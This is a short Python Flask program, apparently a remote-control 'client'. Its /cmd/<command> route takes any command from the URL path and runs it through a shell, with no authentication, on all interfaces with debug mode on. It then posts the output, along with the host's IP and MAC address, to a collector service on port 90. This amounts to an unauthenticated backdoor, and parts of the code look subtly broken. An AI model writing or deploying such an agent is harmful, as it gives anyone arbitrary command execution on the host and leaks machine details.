import socket
import subprocess
import time

import netifaces
import requests
from flask import Flask

app = Flask(__name__)


# 获取MAC地址
def get_mac_address():
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        if interface == 'lo':
            continue
        mac = netifaces.ifaddresses(interface).get(netifaces.AF_LINK)
        if mac:
            return mac[0]['addr']
    return None


# 客户端
@app.route('/cmd/<command>')
def cmd(command):
    mac = get_mac_address()
    if mac is None:
        return "Failed to get MAC address"

    # 执行命令并获取进程对象
    screen_data = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

    while True:
        line = screen_data.stdout.readline()
        if line == b'':
            screen_data.stdout.close()
            break
        dem_stdout = line.decode('gbk').encode('utf-8')

        uid = str(time.time())
        ip = socket.gethostbyname(socket.gethostname())
        mac = get_mac_address()
        info = {'UID': uid, 'IP': ip, 'MAC': mac}

        try:
            requests.post("http://127.0.0.1:90/result/", data={'result': dem_stdout})
            requests.post("http://127.0.0.1:90/save_info/", json=info)  # 发送JSON数据
        except Exception as e:
            print(f"Error sending request: {e}")

    return str(dem_stdout)


if __name__ == '__main__':
    # 启动Flask服务器
    app.run('0.0.0.0', 80, True)
